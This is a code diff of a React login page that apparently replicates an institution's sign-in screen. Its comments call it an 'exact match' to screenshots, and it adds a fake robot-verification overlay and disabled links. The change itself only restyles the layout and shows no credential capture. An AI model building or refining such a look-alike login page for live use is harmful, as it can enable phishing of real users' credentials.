@@ -108,7 +108,7 @@ export default function App() {
 
   // State 3: Main Login Screen with Robot Verification Modal Overlay (Screenshot verifa_cbdc0cb2.jpg)
   return (
-    <div className="relative min-h-screen bg-white">
+    <div style={{ position: 'relative', minHeight: '100vh', backgroundColor: '#ffffff' }}>
       {/* Robot Verification Modal Overlay (Exact match to screenshot verifa_cbdc0cb2.jpg) */}
       {appState === 'robot_check' && (
         <RobotVerificationModal onVerifySuccess={() => setAppState('login')} />
@@ -116,9 +116,8 @@ export default function App() {
 
       {/* Main Page Container (Blurred when verification is active) */}
       <div
-        className={`min-h-screen flex flex-col bg-white text-slate-900 font-sans antialiased selection:bg-[#006a4e] selection:text-white transition-all duration-300 ${
-          appState === 'robot_check' ? 'filter blur-[4px] pointer-events-none select-none' : ''
-        }`}
+        className={appState === 'robot_check' ? 'rf-blurred' : ''}
+        style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column' }}
       >
         {/* Top Header */}
         <Header
@@ -126,34 +125,28 @@ export default function App() {
           onOpenSecurityModal={() => setSecurityModalOpen(true)}
         />
 
-      {/* Main Content Area */}
-      <main className="flex-1 max-w-6xl w-full mx-auto px-0 md:px-6 lg:px-8 py-0 md:py-12">
-        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 lg:gap-14 items-start">
-          {/* Left Column: Form & Mobile App Promo */}
-          <div className="lg:col-span-8 space-y-10">
+        {/* Main Content Area */}
+        <main className="rf-main-wrapper">
+          {/* Left Column: Form & Promo */}
+          <div>
             <LogonForm
               onLinkClick={handleLinkClick}
               onSuccessLogin={handleLoginSubmit}
             />
 
-            <div className="hidden md:block px-4 sm:px-0">
+            <div className="rf-desktop-only" style={{ marginTop: '36px' }}>
               <MobileAppPromo onLinkClick={handleLinkClick} />
             </div>
           </div>
 
           {/* Right Column: Help, Contact & Protection Cards (Desktop only) */}
-          <div className="hidden lg:block lg:col-span-4">
+          <div className="rf-desktop-only">
             <Sidebar onLinkClick={handleLinkClick} />
           </div>
-        </div>
-      </main>
+        </main>
 
-      {/* Footer (Desktop version) */}
-      <div className="hidden md:block">
+        {/* Footer */}
         <Footer onLinkClick={handleLinkClick} />
-      </div>
-
-        {/* End of main page content */}
       </div>
 
       {/* Link Disabled Floating Toast Notification */}
